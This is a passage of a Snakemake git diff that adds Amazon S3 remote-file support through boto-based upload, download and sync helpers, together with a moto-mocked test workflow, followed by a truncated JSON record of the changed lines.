@property\n+    def remote_output_older_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    def transfer_updated_files(self):\n+        for f in self.remote_output_older_than_local | self.remote_input_older_than_local:\n+            f.upload_to_remote()\n+\n+        for f in self.remote_output_newer_than_local | self.remote_input_newer_than_local:\n+            f.download_from_remote()\n+    \n+    @property\n+    def files_to_download(self):\n+        toDownload = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if not f.exists_local and f.exists_remote:\n+                    toDownload.add(f)\n+\n+        toDownload = toDownload | self.remote_input_newer_than_local\n+        return toDownload\n+\n+    @property\n+    def files_to_upload(self):\n+        return self.missing_remote_input & self.remote_input_older_than_local\n+\n     @property\n     def existing_output(self):\n         return filter(lambda f: f.exists, self.expanded_output)\n@@ -231,6 +360,10 @@ def prepare(self):\n                 os.remove(f)\n         for f, f_ in zip(self.output, self.rule.output):\n             f.prepare()\n+\n+        for f in self.files_to_download:\n+            f.download_from_remote()\n+\n         for f in self.log:\n             f.prepare()\n         if self.benchmark:\n@@ -239,6 +372,8 @@ def prepare(self):\n     def cleanup(self):\n         \"\"\" Cleanup output files. \"\"\"\n         to_remove = [f for f in self.expanded_output if f.exists]\n+\n+        to_remove.extend([f for f in self.remote_input if f.exists])\n         if to_remove:\n             logger.info(\"Removing output files of failed job {}\"\n                         \" since they might be corrupted:\\n{}\".format(\n@@ -246,6 +381,23 @@ def cleanup(self):\n             for f in to_remove:\n                 f.remove()\n \n+            self.rmdir_empty_remote_dirs()\n+\n+    @property\n+    def empty_remote_dirs(self):\n+        remote_files = [f for f in (set(self.output) | set(self.input)) if f.is_remote]\n+        emptyDirsToRemove = set(os.path.dirname(f) for f in remote_files if not len(os.listdir(os.path.dirname(f))))\n+        return emptyDirsToRemove\n+\n+    def rmdir_empty_remote_dirs(self):\n+        for d in self.empty_remote_dirs:\n+            pathToDel = d\n+            while len(pathToDel) > 0 and len(os.listdir(pathToDel)) == 0:\n+                logger.info(\"rmdir empty dir: {}\".format(pathToDel))\n+                os.rmdir(pathToDel)\n+                pathToDel = os.path.dirname(pathToDel)\n+\n+\n     def format_wildcards(self, string, **variables):\n         \"\"\" Format a string with variables from the job. \"\"\"\n         _variables = dict()\ndiff --git a\/snakemake\/remote_providers\/RemoteObjectProvider.py b\/snakemake\/remote_providers\/RemoteObjectProvider.py\nnew file mode 100644\nindex 0000000..b040e87\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/RemoteObjectProvider.py\n@@ -0,0 +1,50 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+from abc import ABCMeta, abstractmethod\n+\n+\n+class RemoteObject:\n+    \"\"\" This is an abstract class to be used to derive remote object classes for \n+        different cloud storage providers. For example, there could be classes for interacting with \n+        Amazon AWS S3 and Google Cloud Storage, both derived from this common base class.\n+    \"\"\"\n+    __metaclass__ = ABCMeta\n+\n+    def __init__(self, ioFile):\n+        self._iofile = ioFile\n+        self._file = ioFile._file\n+\n+    @abstractmethod\n+    def file(self):\n+        pass\n+\n+    @abstractmethod\n+    def exists(self):\n+        pass\n+\n+    @abstractmethod\n+    def mtime(self):\n+        pass\n+\n+    @abstractmethod\n+    def size(self):\n+        pass\n+\n+    @abstractmethod\n+    def download(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def upload(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def list(self, *args, **kwargs):\n+        pass\n+\n+    @abstractmethod\n+    def name(self, *args, **kwargs):\n+        pass\ndiff --git a\/snakemake\/remote_providers\/S3.py b\/snakemake\/remote_providers\/S3.py\nnew file mode 100644\nindex 0000000..77b15ea\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/S3.py\n@@ -0,0 +1,90 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import re\n+\n+from snakemake.remote_providers.RemoteObjectProvider import RemoteObject\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import memoize\n+\n+import boto\n+\n+\n+class RemoteObject(RemoteObject):\n+    \"\"\" This is a class to interact with the AWS S3 object store.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+        # pass all args but the first, which is the ioFile\n+        self._s3c = S3Helper(*args[1:], **kwargs)\n+\n+    # === Implementations of abstract class members ===\n+\n+    def file(self):\n+        return self._file\n+\n+    def exists(self):\n+        if self._matched_s3_path:\n+            return self._s3c.exists_in_bucket(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file cannot be parsed as an s3 path in form 'bucket\/key': %s\" % self.file())\n+\n+    def mtime(self):\n+        if self.exists():\n+            return self._s3c.key_last_modified(self.s3_bucket, self.s3_key)\n+        else:\n+            raise S3FileException(\"The file does not seem to exist remotely: %s\" % self.file())\n+\n+    def size(self):\n+        if self.exists():\n+            return self._s3c.key_size(self.s3_bucket, self.s3_key)\n+        else:\n+            return self._iofile.size_local\n+\n+    def download(self):\n+        self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file())\n+\n+    def upload(self):\n+        conn = boto.connect_s3()\n+        if self.size() > 5000:\n+            self._s3c.upload_to_s3_multipart(self.s3_bucket, self.file(), self.s3_key)\n+        else:\n+            self._s3c.upload_to_s3(self.s3_bucket, self.file(), self.s3_key)\n+\n+    @property\n+    def list(self):\n+        return self._s3c.list_keys(self.s3_bucket)\n+\n+    # === Related methods ===\n+\n+    @property\n+    def _matched_s3_path(self):\n+        return re.search(\"(?P<bucket>[^\/]*)\/(?P<key>.*)\", self.file())\n+\n+    @property\n+    def s3_bucket(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"bucket\")\n+        return None\n+\n+    @property\n+    def name(self):\n+        return self.s3_key\n+\n+    @property\n+    def s3_key(self):\n+        if len(self._matched_s3_path.groups()) == 2:\n+            return self._matched_s3_path.group(\"key\")\n+\n+    def s3_create_stub(self):\n+        if self._matched_s3_path:\n+            if not self.exists:\n+                self._s3c.download_from_s3(self.s3_bucket, self.s3_key, self.file, createStubOnly=True)\n+        else:\n+            raise S3FileException(\"The file to be downloaded cannot be parsed as an s3 path in form 'bucket\/key': %s\" %\n+                                  self.file())\ndiff --git a\/snakemake\/remote_providers\/__init__.py b\/snakemake\/remote_providers\/__init__.py\nnew file mode 100644\nindex 0000000..8b13789\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/__init__.py\n@@ -0,0 +1 @@\n+\ndiff --git a\/snakemake\/remote_providers\/implementations\/S3.py b\/snakemake\/remote_providers\/implementations\/S3.py\nnew file mode 100644\nindex 0000000..c6cb622\n--- \/dev\/null\n+++ b\/snakemake\/remote_providers\/implementations\/S3.py\n@@ -0,0 +1,341 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os\n+import math\n+import time\n+import email.utils\n+from time import mktime\n+import datetime\n+from multiprocessing import Pool\n+\n+# third-party modules\n+import boto\n+from boto.s3.key import Key\n+from filechunkio import FileChunkIO\n+\n+\n+class S3Helper(object):\n+\n+    def __init__(self, *args, **kwargs):\n+        # as per boto, expects the environment variables to be set:\n+        # AWS_ACCESS_KEY_ID\n+        # AWS_SECRET_ACCESS_KEY\n+        # Otherwise these values need to be passed in as kwargs\n+        self.conn = boto.connect_s3(*args, **kwargs)\n+\n+    def upload_to_s3(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        k = Key(b)\n+\n+        if key:\n+            k.key = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+            k.key = pathKey\n+        try:\n+            bytesWritten = k.set_contents_from_filename(\n+                filePath,\n+                replace=replace,\n+                reduced_redundancy=reduced_redundancy,\n+                headers=headers)\n+            if bytesWritten:\n+                return k.key\n+            else:\n+                return None\n+        except:\n+            return None\n+\n+    def download_from_s3(\n+            self,\n+            bucketName,\n+            key,\n+            destinationPath=None,\n+            expandKeyIntoDirs=True,\n+            makeDestDirs=True,\n+            headers=None, createStubOnly=False):\n+        \"\"\" Download a file from s3\n+\n+            This function downloads an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                destinationPath: If specified, the file will be saved to this path, otherwise cwd.\n+                expandKeyIntoDirs: Since S3 keys can include slashes, if this is True (defult)\n+                    then S3 keys with slashes are expanded into directories on the receiving end.\n+                    If it is False, the key is passed to os.path.basename() to get the substring\n+                    following the last slash.\n+                makeDestDirs: If this is True (default) and the destination path includes directories\n+                    that do not exist, they will be created.\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The destination path of the downloaded file on the receiving end, or None if the filePath\n+                could not be downloaded\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+\n+        if destinationPath:\n+            destinationPath = os.path.realpath(os.path.expanduser(destinationPath))\n+        else:\n+            if expandKeyIntoDirs:\n+                destinationPath = os.path.join(os.getcwd(), key)\n+            else:\n+                destinationPath = os.path.join(os.getcwd(), os.path.basename(key))\n+\n+        # if the destination path does not exist\n+        if not os.path.exists(os.path.dirname(destinationPath)) and makeDestDirs:\n+            os.makedirs(os.path.dirname(destinationPath))\n+\n+        k.key = key if key else os.path.basename(filePath)\n+\n+        try:\n+            if not createStubOnly:\n+                k.get_contents_to_filename(destinationPath, headers=headers)\n+            else:\n+                # just create an empty file with the right timestamps\n+                with open(destinationPath, 'wb') as fp:\n+                    modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+                    modified_stamp = int(email.utils.mktime_tz(modified_tuple))\n+                    os.utime(fp.name, (modified_stamp, modified_stamp))\n+            return destinationPath\n+        except:\n+            return None\n+\n+    def _upload_part(self, bucketName, multipart_id, part_num, source_path, offset, bytesToWrite, numberOfRetries=5):\n+\n+        def _upload(retriesRemaining=numberOfRetries):\n+            try:\n+                b = self.conn.get_bucket(bucketName)\n+                for mp in b.get_all_multipart_uploads():\n+                    if mp.id == multipart_id:\n+                        with FileChunkIO(source_path, 'r', offset=offset, bytes=bytesToWrite) as fp:\n+                            mp.upload_part_from_file(fp=fp, part_num=part_num)\n+                        break\n+            except Exception() as e:\n+                if retriesRemaining:\n+                    _upload(retriesRemaining=retriesRemaining - 1)\n+                else:\n+                    raise e\n+\n+        _upload()\n+\n+    def upload_to_s3_multipart(\n+            self,\n+            bucketName,\n+            filePath,\n+            key=None,\n+            useRelativePathForKey=True,\n+            relativeStartDir=None,\n+            replace=False,\n+            reduced_redundancy=False,\n+            headers=None,\n+            parallel_processes=4):\n+        \"\"\" Upload a file to S3\n+\n+            This function uploads a file to an AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                filePath: The path to the file to upload.\n+                key: The key to set for the file on S3. If not specified, this will default to the\n+                    name of the file.\n+                useRelativePathForKey: If set to True (default), and key is None, the S3 key will include slashes\n+                    representing the path of the file relative to the CWD. If False only the\n+                    file basename will be used for the key.\n+                relativeStartDir: The start dir to use for useRelativePathForKey. No effect if key is set.\n+                replace: If True a file with the same key will be replaced with the one being written\n+                reduced_redundancy: Sets the file to AWS reduced redundancy storage.\n+                headers: additional heads to pass to AWS\n+                parallel_processes: Number of concurrent uploads\n+\n+            Returns: The key of the file on S3 if written, None otherwise\n+        \"\"\"\n+        filePath = os.path.realpath(os.path.expanduser(filePath))\n+\n+        assert bucketName, \"bucketName must be specified\"\n+        assert os.path.exists(filePath), \"The file path specified does not exist: %s\" % filePath\n+        assert os.path.isfile(filePath), \"The file path specified does not appear to be a file: %s\" % filePath\n+\n+        try:\n+            b = self.conn.get_bucket(bucketName)\n+        except:\n+            b = self.conn.create_bucket(bucketName)\n+\n+        pathKey = None\n+        if key:\n+            pathKey = key\n+        else:\n+            if useRelativePathForKey:\n+                if relativeStartDir:\n+                    pathKey = os.path.relpath(filePath, relativeStartDir)\n+                else:\n+                    pathKey = os.path.relpath(filePath)\n+            else:\n+                pathKey = os.path.basename(filePath)\n+\n+        mp = b.initiate_multipart_upload(pathKey, headers=headers)\n+\n+        sourceSize = os.stat(filePath).st_size\n+\n+        bytesPerChunk = 52428800  # 50MB = 50 * 1024 * 1024\n+        chunkCount = int(math.ceil(sourceSize \/ float(bytesPerChunk)))\n+\n+        pool = Pool(processes=parallel_processes)\n+        for i in range(chunkCount):\n+            offset = i * bytesPerChunk\n+            remainingBytes = sourceSize - offset\n+            bytesToWrite = min([bytesPerChunk, remainingBytes])\n+            partNum = i + 1\n+            pool.apply_async(self._upload_part, [bucketName, mp.id, partNum, filePath, offset, bytesToWrite])\n+        pool.close()\n+        pool.join()\n+\n+        if len(mp.get_all_parts()) == chunkCount:\n+            mp.complete_upload()\n+            try:\n+                key = b.get_key(pathKey)\n+                return key.key\n+            except:\n+                return None\n+        else:\n+            mp.cancel_upload()\n+            return None\n+\n+    def delete_from_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Delete a file from s3\n+\n+            This function deletes an object from a specified AWS S3 bucket.\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                The name of the object deleted\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        ret = k.delete(headers=headers)\n+        return ret.name\n+\n+    def exists_in_bucket(self, bucketName, key, headers=None):\n+        \"\"\" Returns whether the key exists in the bucket\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                True | False\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = Key(b)\n+        k.key = key\n+        return k.exists(headers=headers)\n+\n+    def key_size(self, bucketName, key, headers=None):\n+        \"\"\" Returns the size of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                Size in kb\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        return k.size\n+\n+    def key_last_modified(self, bucketName, key, headers=None):\n+        \"\"\" Returns a timestamp of a key based on a HEAD request\n+\n+            Args:\n+                bucketName: the name of the S3 bucket to use (bucket name only, not ARN)\n+                key: the key of the object to delete from the bucket\n+                headers: Additional headers to pass to AWS\n+\n+            Returns:\n+                timestamp\n+        \"\"\"\n+        assert bucketName, \"bucketName must be specified\"\n+        assert key, \"Key must be specified\"\n+\n+        b = self.conn.get_bucket(bucketName)\n+        k = b.lookup(key)\n+\n+        # email.utils parsing of timestamp mirrors boto whereas\n+        # time.strptime() can have TZ issues due to DST\n+        modified_tuple = email.utils.parsedate_tz(k.last_modified)\n+        epochTime = int(email.utils.mktime_tz(modified_tuple))\n+\n+        return epochTime\n+\n+    def list_keys(self, bucketName):\n+        return self.conn.get_bucket(bucketName).list()\ndiff --git a\/snakemake\/rules.py b\/snakemake\/rules.py\nindex 3608167..5324eeb 100644\n--- a\/snakemake\/rules.py\n+++ b\/snakemake\/rules.py\n@@ -95,7 +95,12 @@ def get_io(rule):\n             if f in dynamic_io:\n                 try:\n                     for e in reversed(expand(f, zip, **wildcards)):\n-                        expansion[i].append(IOFile(e, rule=branch))\n+                        # need to clone the flags so intermediate\n+                        # dynamic remote file paths are expanded and \n+                        # removed appropriately\n+                        ioFile = IOFile(e, rule=branch)\n+                        ioFile.clone_flags(f)\n+                        expansion[i].append(ioFile)\n                 except KeyError:\n                     return None\n \ndiff --git a\/snakemake\/workflow.py b\/snakemake\/workflow.py\nindex b035bc3..833bd90 100644\n--- a\/snakemake\/workflow.py\n+++ b\/snakemake\/workflow.py\n@@ -23,7 +23,7 @@\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import update_config\n \ndiff --git a\/tests\/test_remote\/S3Mocked.py b\/tests\/test_remote\/S3Mocked.py\nnew file mode 100644\nindex 0000000..d8cc489\n--- \/dev\/null\n+++ b\/tests\/test_remote\/S3Mocked.py\n@@ -0,0 +1,103 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+# built-ins\n+import os, sys\n+from contextlib import contextmanager\n+import pickle\n+import time\n+import threading\n+\n+# third-party\n+import boto\n+from moto import mock_s3\n+\n+# intra-module\n+from snakemake.remote_providers.S3 import RemoteObject as S3RemoteObject\n+from snakemake.remote_providers.implementations.S3 import S3Helper\n+from snakemake.decorators import decAllMethods\n+\n+def noop():\n+    pass\n+\n+def pickledMotoWrapper(func):\n+    \"\"\"\n+        This is a class decorator that in turn decorates all methods within\n+        a class to mock out boto calls with moto-simulated ones.\n+        Since the moto backends are not presistent across calls by default, \n+        the wrapper also pickles the bucket state after each function call,\n+        and restores it before execution. This way uploaded files are available\n+        for follow-on tasks. Since snakemake may execute with multiple threads\n+        it also waits for the pickled bucket state file to be available before\n+        loading it in. This is a hackey alternative to using proper locks,\n+        but works ok in practice.\n+    \"\"\"\n+    def wrapper_func(self, *args, **kwargs):\n+        motoContextFile = \"motoState.p\"\n+\n+        motoContext = mock_s3()\n+\n+        # load moto buckets from pickle\n+        if os.path.isfile(motoContextFile) and os.path.getsize(motoContextFile) > 0:\n+            with file_lock(motoContextFile):\n+                with open( motoContextFile, \"rb\" ) as f:\n+                    motoContext.backends[\"global\"].buckets = pickle.load( f )\n+\n+        motoContext.backends[\"global\"].reset = noop\n+\n+        mockedFunction = motoContext(func)\n+\n+        retval = mockedFunction(self, *args, **kwargs)\n+\n+        with file_lock(motoContextFile):\n+            with open( motoContextFile, \"wb\" ) as f:\n+                pickle.dump(motoContext.backends[\"global\"].buckets, f)\n+\n+        return retval\n+    return wrapper_func\n+\n+@decAllMethods(pickledMotoWrapper, prefix=None)\n+class RemoteObject(S3RemoteObject):\n+    \"\"\" \n+        This is a derivative of the S3 remote provider that mocks\n+        out boto-based S3 calls using the \"moto\" Python package.\n+        Only the initializer is different; it \"uploads\" the input \n+        test file to the moto-simulated bucket at the start.\n+    \"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        bucketName = 'test-remote-bucket'\n+        testFile = \"test.txt\"\n+\n+        conn = boto.connect_s3()\n+        if bucketName not in [b.name for b in conn.get_all_buckets()]:\n+            conn.create_bucket(bucketName)\n+\n+        # \"Upload\" files that should be in S3 before tests...\n+        s3c = S3Helper()\n+        if not s3c.exists_in_bucket(bucketName, testFile):\n+            s3c.upload_to_s3(bucketName, testFile)\n+\n+        return super(RemoteObject, self).__init__(*args, **kwargs)\n+\n+\n+# ====== Helpers =====\n+\n+@contextmanager\n+def file_lock(filepath):\n+    lock_file = filepath + \".lock\"\n+\n+    while os.path.isfile(lock_file):\n+        time.sleep(0.1)\n+\n+    with open(lock_file, 'w') as f:\n+        f.write(\"1\")\n+\n+    try:\n+        yield\n+    finally:\n+        if os.path.isfile(lock_file):\n+            os.remove(lock_file)\n+\ndiff --git a\/tests\/test_remote\/Snakefile b\/tests\/test_remote\/Snakefile\nnew file mode 100644\nindex 0000000..b2e1298\n--- \/dev\/null\n+++ b\/tests\/test_remote\/Snakefile\n@@ -0,0 +1,49 @@\n+import re, os, sys\n+\n+import S3Mocked as S3Mocked\n+\n+#remote dynamic file test\n+\n+# This makes use of a special provider that mocks up S3 using the moto\n+# library so that boto calls hit local \"buckets\"\n+\n+rule all:\n+    input:\n+        # only keeping the file so we can copy it out to the cwd\n+        remote(\"test-remote-bucket\/out.txt\", keep=True, provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell(\"mv test-remote-bucket\/out.txt .\/\")\n+\n+rule split:\n+    input: remote('test-remote-bucket\/test.txt', keep=False, provider=S3Mocked, additional_kwargs={})\n+    output: remote(dynamic('test-remote-bucket\/prefix{split_id}.txt'), provider=S3Mocked, additional_kwargs={})\n+    run:\n+        shell('split -l 2 {input} test-remote-bucket\/prefix')\n+        for f in os.listdir(os.getcwd()+\"\/test-remote-bucket\"):\n+            if re.search('prefix[a-z][a-z]', f):\n+                os.rename(\"test-remote-bucket\/\"+f, \"test-remote-bucket\/\"+f + '.txt')\n+\n+rule cut:\n+    input: remote('test-remote-bucket\/prefix{split_id,[a-z][a-z]}.txt', provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket\/{split_id}_cut.txt', provider=S3Mocked, additional_kwargs={})\n+    shell: 'cut -f 1,2 {input} > {output}'\n+\n+rule merge:\n+    input: \n+        remote(dynamic('test-remote-bucket\/{split_id}_cut.txt'), provider=S3Mocked, additional_kwargs={})\n+    output: \n+        remote('test-remote-bucket\/out.txt', provider=S3Mocked, additional_kwargs={}),\n+    run: \n+        shell('echo {input}; cat {input} > {output}')\n+\n+\n+# after we finish, we need to remove the pickle storing\n+# the local moto \"buckets\" so we are starting fresh\n+# next time this test is run. This file is created by\n+# the moto wrapper defined in S3Mocked.py\n+onsuccess:\n+    shell(\"rm .\/motoState.p\")\n+\n+onerror:\n+    shell(\"rm .\/motoState.p\")\n\\ No newline at end of file\ndiff --git a\/tests\/test_benchmark\/expected-results\/test.benchmark.json b\/tests\/test_remote\/__init__.py\nsimilarity index 100%\nrename from tests\/test_benchmark\/expected-results\/test.benchmark.json\nrename to tests\/test_remote\/__init__.py\ndiff --git a\/tests\/test_remote\/expected-results\/out.txt b\/tests\/test_remote\/expected-results\/out.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- \/dev\/null\n+++ b\/tests\/test_remote\/expected-results\/out.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a\/tests\/test_remote\/test.txt b\/tests\/test_remote\/test.txt\nnew file mode 100644\nindex 0000000..818b3c5\n--- \/dev\/null\n+++ b\/tests\/test_remote\/test.txt\n@@ -0,0 +1,4 @@\n+0       1       2\n+0       1       2\n+0       1       2\n+0       1       2\ndiff --git a\/tests\/tests.py b\/tests\/tests.py\nold mode 100644\nnew mode 100755\nindex 37dd180..6b53573\n--- a\/tests\/tests.py\n+++ b\/tests\/tests.py\n@@ -265,6 +265,9 @@ def test_multiple_includes():\n def test_yaml_config():\n     run(dpath(\"test_yaml_config\"))\n \n+def test_remote():\n+   run(dpath(\"test_remote\"))\n+\n \n def test_cluster_sync():\n     run(dpath(\"test14\"),\n","files":{"\/snakemake\/dag.py":{"changes":[{"diff":"\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n","add":1,"remove":1,"filename":"\/snakemake\/dag.py","badparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"],"goodparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]},{"diff":"\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n","add":1,"remove":1,"filename":"\/snakemake\/dag.py","badparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"],"goodparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]}]},"\/snakemake\/io.py":{"changes":[{"diff":"\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"],"goodparts":["import functools","from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException","import snakemake.remote_providers.S3 as S3"]},{"diff":"\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n","add":45,"remove":3,"filename":"\/snakemake\/io.py","badparts":["    def protected(self):","        return self.exists and not os.access(self.file, os.W_OK)","        if not self.exists and lstat(self.file):"],"goodparts":["    @_referToRemote","    def exists_local(self):","        return os.path.exists(self.file)","    @property","    def exists_remote(self):","        return (self.is_remote and self.remote_object.exists())","    def protected(self):","        return self.exists_local and not os.access(self.file, os.W_OK)","    @property","    @_referToRemote","        return 